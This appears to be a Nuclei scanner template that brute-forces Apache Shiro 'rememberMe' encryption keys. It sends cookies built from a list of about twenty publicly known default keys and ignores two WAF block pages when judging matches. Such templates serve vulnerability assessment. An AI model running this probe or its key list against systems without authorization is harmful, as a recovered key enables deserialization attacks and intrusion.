id: shiro-default-key
opsec: true
info:
  name: brute Shiro key
  severity: critical
  tags: shiro

http:
  - raw:
      - |
        GET / HTTP/1.1
        Host: {{Hostname}}
        Cookie: JSESSIONID={{to_upper(rand_text_alphanumeric(32,""))}};rememberMe=123;

      - |
        GET / HTTP/1.1
        Host: {{Hostname}}
        Cookie: JSESSIONID={{to_upper(rand_text_alphanumeric(32,""))}};rememberMe={{generate_shiro_gadget(key, mode)}};

    attack: clusterbomb
    payloads:
      key:
        - "kPH+bIxk5D2deZiIxcaaaA=="
        - "2AvVhdsgUs0FSA3SDFAdag=="
        - "3AvVhmFLUs0KTA3Kprsdag=="
        - "4AvVhmFLUs0KTA3Kprsdag=="
        - "5aaC5qKm5oqA5pyvAAAAAA=="
        - "6ZmI6I2j5Y+R5aSn5ZOlAA=="
        - "bWljcm9zAAAAAAAAAAAAAA=="
        - "wGiHplamyXlVB11UXWol8g=="
        - "Z3VucwAAAAAAAAAAAAAAAA=="
        - "MTIzNDU2Nzg5MGFiY2RlZg=="
        - "zSyK5Kp6PZAAjlT+eeNMlg=="
        - "U3ByaW5nQmxhZGUAAAAAAA=="
        - "5AvVhmFLUs0KTA3Kprsdag=="
        - "bXdrXl9eNjY2KjA3Z2otPQ=="
        - "fCq+/xW488hMTCD+cmJ3aQ=="
        - "1QWLxg+NYmxraMoxAXu/Iw=="
        - "ZUdsaGJuSmxibVI2ZHc9PQ=="
        - "L7RioUULEFhRyxM7a2R/Yg=="
        - "r0e3c16IdVkouZgk1TKVMg=="
        - "bWluZS1hc3NldC1rZXk6QQ=="
      mode:
        - "cbc"
        - "gcm"

    stop-at-first-match: true
    matchers:
      - type: dsl
        dsl:
          - 'contains(header_1, "Set-Cookie") && (contains(header_1, "rememberMe=") || contains(header_1, "=deleteMe"))'
          - '!contains(header_2, "rememberMe=") && !contains(header_2, "=deleteMe")'
          - '!contains(body_2, "<p>当前访问疑似黑客攻击，已被网站管理员设置拦截并记录</p>")' # WAF Block Page
          - '!contains(body_2, "很抱歉，由于您访问的URL有可能对网站造成安全威胁，您的访问被阻断")' # WAF Block Page
        condition: and